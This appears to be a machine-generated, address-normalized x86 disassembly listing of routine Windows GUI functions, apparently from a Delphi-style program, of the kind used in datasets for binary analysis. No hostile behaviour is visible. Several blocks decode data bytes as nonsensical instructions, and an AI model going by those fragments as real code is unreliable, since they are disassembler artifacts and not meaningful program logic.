mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4394ec
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_439af8
sub_439500
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_439af8
mov eax ebx
call sub_446940
sub_439524
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_446940
sub_439538
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_446940
sub_43957c
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_446940
sub_43967d
jmp sub_403988
sub_439684
pop ebx
pop ecx
pop ebp
retn
sub_43979c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4493d8
push eax
call SetWindowTextA
pop ebx
retn
sub_4397b8
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43985e
jmp sub_403988
sub_439865
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4398fe
jmp sub_403988
sub_439a77
jmp sub_403988
sub_439adc
push ebx
mov ebx eax
mov eax ebx
call sub_439590
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44673c
pop ebx
retn
sub_439bdc
push ebx
mov ebx eax
mov eax ebx
call sub_4427c4
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_439cd4
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403430
sub_439e36
jmp sub_403988
sub_439ee0
mov eax [ r-xdata ]
retn
sub_439ee8
xor eax eax
retn
sub_439f0c
retn
sub_43a024
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_446940
sub_43a09c
push ebx
mov ebx eax
mov eax ebx
call sub_4599ec
test eax eax
je r-xdata
mov eax ebx
call sub_4440f4
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_43a0c0
xor eax eax
retn
sub_43a187
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3e39173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_43a1a0
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403430
sub_43a291
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43a29a
jmp sub_403988
j_sub_43a291
jmp sub_43a291
sub_43a2a1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a44c
push ebx
mov ebx eax
mov eax ebx
call sub_4427c4
mov eax ebx
call sub_4440f4
pop ebx
retn
sub_43a460
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_43a46c
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_446940
sub_43a480
test dl dl
je r-xdata
xor edx edx
call sub_43a494
retn
mov dl 0x1
call sub_43a494
retn
sub_43a570
push ebx
mov ebx eax
mov eax ebx
call sub_44798c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43a584
call sub_446940
retn
sub_43a61a
jmp sub_403988
sub_43a621
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a628
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_43a698
mov al [ eax + 0x211 ]
retn
sub_43a6cc
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_446940
sub_43a8ac
call sub_446940
retn
sub_43a929
jmp sub_403988
sub_43a930
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a968
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x10 ]
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43aa48
jmp sub_403988
sub_43aa4f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43aadb
jmp sub_403988
sub_43aae2
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ac21
jmp sub_403988
sub_43ac28
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43acbd
jmp sub_403988
sub_43acc4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43accc
push esi
mov eax [ eax + 0x10 ]
mov si 0xffae
call sub_403430
pop esi
retn
sub_43ae0a
jmp sub_403988
sub_43ae2c
jmp sub_403988
sub_43ae33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ae3c
push esi
mov eax [ eax + 0x10 ]
mov si 0xffaf
call sub_403430
pop esi
retn
sub_43afa6
jmp sub_403988
sub_43afc3
jmp sub_403988
sub_43afca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b16d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_43b17b
jmp sub_403988
j_sub_43b16d
jmp sub_43b16d
sub_43b182
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b1d0
push esi
mov si 0xffb1
call sub_403430
pop esi
retn
sub_43b1dc
push esi
mov si 0xffb0
call sub_403430
pop esi
retn
sub_43b230
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_43b39b
jmp sub_403988
sub_43b3a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43b4ec
mov dl [ eax + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x214 ]
retn
sub_43b510
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43b578
cmp dl [ eax + 0x23b ]
je r-xdata
retn
mov [ eax + 0x23b ] dl
call sub_446940
sub_43b5f8
cmp edx [ eax + 0x230 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x230 ] edx
call sub_446940
sub_43b610
test edx edx
jge r-xdata
cmp edx [ eax + 0x23c ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x23c ] edx
call sub_446940
sub_43b62c
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_446940
sub_43b740
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_446940
sub_43b7a0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43b864
jmp sub_403988
sub_43b86b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b906
jmp sub_403988
sub_43b90d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b914
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_446940
sub_43bf50
push ebx
mov ebx eax
mov eax ebx
call sub_44798c
mov eax ebx
call sub_43b418
pop ebx
retn
sub_43c0d0
jmp sub_403988
sub_43c0d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43c0e0
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_43c4f4
jmp sub_403988
sub_43c4fb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c5d8
jmp sub_403988
sub_43c5df
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c5e8
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_43c654
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43c6c1
jmp sub_403988
sub_43c6c8
pop ebp
retn
sub_43c6cc
sub [ rw-data ] 0x1
retn
sub_43c829
jmp sub_403988
sub_43c830
pop ebp
retn
sub_43c834
sub [ rw-data ] 0x1
retn
sub_43c84d
add eax 0xffffffe0
jmp sub_43ce34
sub_43c855
add eax 0xffffffe0
jmp sub_43ce9c
sub_43c85d
add eax 0xffffffe0
jmp sub_43cfb0
sub_43c865
add eax 0xffffffe0
jmp sub_43d024
sub_43c86d
add eax 0xffffffe0
jmp sub_43cae0
sub_43c875
add eax 0xffffffe0
jmp sub_43caf4
sub_43c87d
add eax 0xffffffe0
jmp sub_43cb6c
sub_43c885
add eax 0xffffffe0
jmp sub_43cc10
sub_43c88d
add eax 0xffffffe0
jmp sub_43cc14
sub_43c895
add eax 0xffffffe0
jmp sub_43cc9c
sub_43c89d
add eax 0xffffffe0
jmp sub_43cde4
sub_43c8a5
add eax 0xffffffe0
jmp sub_43cde8
sub_43c8ad
add eax 0xffffffe0
jmp sub_43ce04
sub_43c8b5
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405ae4
sub_43c8bf
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405b0c
sub_43ca9d
jmp sub_403988
sub_43caa4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cae0
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_40405c
pop ebx
retn
sub_43cb5b
jmp sub_403988
sub_43cb62
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43cbf4
jmp sub_403988
sub_43cbfb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cc10
mov al 0x1
retn
sub_43cc8f
jmp sub_403988
sub_43cc96
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cd94
jmp sub_403988
sub_43cd9b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cde4
mov [ eax + 0xc ] edx
retn
sub_43cde8
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43ce8c
jmp sub_403988
sub_43ce93
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43cf92
jmp sub_403988
sub_43cf99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d012
jmp sub_403988
sub_43d019
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d0a4
jmp sub_403988
sub_43d0ab
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d19f
jmp sub_403988
sub_43d1a6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d268
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43d1b4
call EnumWindows
retn
sub_43d2fa
jmp sub_403988
sub_43d301
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43d30c
xor eax eax
retn
sub_43d405
jmp sub_403988
sub_43d40c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d4f6
jmp sub_403988
sub_43d4fd
pop ebp
retn
sub_43d552
jmp sub_403988
sub_43d559
pop ebp
retn
sub_43e6dc
jmp r-xdata
sub_43e6de
0xe8ffe9ff 0xe7ff
sub_43e6e5
jmp esi
sub_43f2fa
inc ebx
add [ edx ] ah
hlt
sub_43f4b1
add eax 0xffffff8c
jmp sub_44ba00
sub_43f4b9
add eax 0xffffff8c
jmp sub_44ba04
sub_43f4c1
add eax 0xffffff8c
jmp sub_44baf0
sub_43f4c9
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43f4d6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43f4e3
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43f4f0
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43f4fd
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43f50a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43f517
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43f524
add eax 0xffffff8c
jmp sub_44d160
sub_43f52c
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405ae4
sub_43f536
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405b0c
sub_43f54c
sub al 0xf5
inc ebx
add [ esi ] dh
cmc
inc ebx
add [ eax - 0xb ] al
inc ebx
add [ ecx - 0x46ffbc0c ] dh
hlt
sub_43f998
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43fcab
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_419f18
retn
sub_43fcc8
push 0x15
mov ecx rw-data
call sub_419ed8
retn
sub_43fd60
call GetCapture
call sub_43fa98
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43ffc4
push ebx
push eax
push sub_440148
call sub_421874
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43ffdc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44000c
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421928
pop ebx
retn
sub_4400ea
jmp sub_4036d4
sub_44011c
xor eax eax
retn
sub_440120
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_440138
retn
sub_44013c
mov eax [ rw-data ]
retn
sub_440144
retn
sub_440172
jmp sub_4036d4
sub_440177
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440194
call sub_40348c
xor eax eax
mov [ rw-data ] eax
retn
sub_4401a4
call sub_403488
xor eax eax
mov [ rw-data ] eax
retn
sub_4401b4
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403558
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_440264
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44027c
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4402c8
retn
sub_440480
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403430
pop esi
retn
sub_440494
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403430
pop esi
retn
sub_4404a8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4404b4
mov eax 0x4
retn
sub_4404bc
retn
sub_4410ad
jmp sub_4036d4
sub_44139a
jmp sub_403988
sub_44140c
jmp sub_403988
sub_441418
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_441140
sub_441597
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4248b0
retn
sub_4415ad
jmp sub_403988
sub_4415d4
jmp sub_403988
sub_441656
jmp sub_403988
sub_44167e
jmp sub_403988
sub_441685
mov esp ebp
pop ebp
retn
sub_44173d
jmp sub_403988
sub_441794
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_441760
mov [ ebx + 0x58 ] esi
sub_4418e8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4418fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4419e5
jmp sub_403988
sub_4419ec
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441a6f
jmp sub_403988
sub_441a76
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_441e44
xor eax eax
retn
sub_441e48
mov al [ eax + 0x58 ]
retn
sub_441e4c
xor eax eax
retn
sub_441e50
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_441e58
mov eax [ eax + 0x30 ]
retn
sub_441efc
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_441fa8
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_441fc0
mov [ eax + 0x5d ] dl
retn
sub_441fc4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_445ba4
sub_441fd4
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4424b7
jmp sub_403988
sub_4424be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442520
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_4425a4
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_4426c1
jmp sub_403988
sub_4426c8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4427c4
push eax
xor ecx ecx
mov edx 0xb037
call sub_443d6c
retn
sub_442985
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403430
sub_442a36
jmp sub_403988
sub_442a3d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442b14
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_443d6c
sub_442b2c
push 0x0
xor ecx ecx
mov edx 0xe
call sub_443d6c
retn
sub_442b3c
push edx
mov edx 0xd
call sub_443d6c
retn
sub_442b48
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_442b5c
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_442c3d
jmp sub_403988
sub_442c44
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442c4c
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_443d6c
sub_442cbc
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_442cd0
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_442cdc
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_442ce4
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_443d6c
sub_442d08
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_443d6c
sub_442d2c
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_443d6c
sub_442d74
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_442d7c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_443d6c
sub_442da0
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_443d6c
sub_442dc4
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_443d6c
sub_442de0
push ebx
mov ebx eax
call sub_43fd60
cmp ebx eax
sete al
pop ebx
retn
sub_442e18
push esi
mov dl 0x1
mov si 0xffce
call sub_403430
pop esi
retn
sub_442f62
jmp sub_403988
sub_442f69
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44308c
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_443000
retn
sub_4430e0
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_4430f4
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4431d9
jmp sub_403988
sub_4431f8
xor eax eax
retn
sub_4431fc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_443214
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_44322c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_443248
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_443260
retn
sub_443324
retn
sub_443328
cmp eax [ rw-data ]
sete al
retn
sub_44339c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4434b8
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403430
pop esi
pop ebp
retn 0x4
sub_4434f8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44378f
jmp sub_403988
sub_443796
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4437a0
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403430
pop esi
retn
sub_4437b4
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403430
pop esi
retn
sub_443a83
jmp sub_403988
sub_443b2c
push esi
mov si 0xffee
call sub_403430
pop esi
retn
sub_443b38
mov al 0x1
retn
sub_443e10
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_44220c
retn
sub_443e34
retn
sub_44404d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41db28
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_444068
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41fe60
retn
sub_444160
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_444778
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_444780
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_444788
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_444840
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444860
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_442d08
mov [ ebx + 0x9a ] 0x1
sub_4448b8
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_442cac
mov [ ebx + 0x56 ] 0x1
sub_4448dc
mov [ edx + 0xc ] 0x1
retn
sub_4448e4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_443d6c
sub_4448fc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_443d6c
sub_444914
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_444b7a
jmp sub_403988
sub_444b81
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444bac
mov eax [ r-xdata ]
retn
sub_444d48
jmp sub_403988
sub_444d4f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444e70
mov eax [ eax + 0xb8 ]
retn
sub_444ed8
push ebx
mov ebx eax
mov eax ebx
call sub_4431fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_444ef4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44508c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4450bc
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_4450c4
call sub_441c78
retn
sub_4451c4
jmp sub_403988
sub_445384
jmp sub_403988
sub_4453d4
jmp sub_403988
sub_44540c
retn
sub_445695
jmp sub_403988
sub_44581d
jmp sub_403988
sub_445b7f
jmp sub_403988
sub_445c2b
jmp sub_403988
sub_445c38
inc [ eax + 0x160 ]
retn
sub_445c40
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_445c60
sub_445c60
xor edx edx
call sub_445ba4
retn
sub_445d2d
jmp sub_403988
sub_445d34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445e23
jmp sub_403988
sub_44634a
jmp sub_403988
sub_446351
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446519
jmp sub_403988
sub_446520
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4465f4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4467e1
jmp sub_403988
sub_4467e8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4468d8
xor eax eax
retn
sub_446940
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_443d6c
sub_446a6e
jmp sub_4036d4
sub_446ba3
jmp sub_403988
sub_446baa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446bb4
